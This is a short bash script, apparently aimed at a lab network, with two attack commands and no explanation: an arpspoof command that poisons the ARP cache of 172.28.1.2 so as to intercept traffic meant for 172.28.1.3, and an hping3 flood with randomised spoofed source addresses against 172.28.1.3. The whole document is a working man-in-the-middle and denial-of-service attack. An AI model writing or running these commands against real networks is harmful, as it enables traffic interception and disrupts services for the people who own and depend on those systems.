#!/bin/bash

arpspoof -i eth0 -t 172.28.1.2 172.28.1.3

hping3 --flood --rand-source 172.28.1.3